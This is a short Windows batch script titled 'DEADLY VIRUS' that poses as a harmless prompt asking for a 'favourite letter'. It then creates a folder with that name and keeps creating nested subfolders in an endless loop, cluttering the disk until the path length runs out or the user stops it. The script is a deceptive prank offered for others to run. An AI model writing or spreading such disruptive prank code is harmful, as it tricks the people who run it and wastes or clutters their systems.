@echo off
title DEADLY VIRUS

:mkd
cls
set /p folnm=" Enter your favourite letter  :  "
if %folnm%==0 goto end
if %folnm%==1 goto end
if %folnm%==2 goto end
if %folnm%==3 goto end
if %folnm%==4 goto end
if %folnm%==5 goto end
if %folnm%==6 goto end
if %folnm%==7 goto end
if %folnm%==8 goto end
if %folnm%==9 goto end
mkdir %folnm%
pause

:loop
mkdir %folnm%\%folnm%
set folnm=%folnm%\%folnm%
goto loop
pause

:end
exit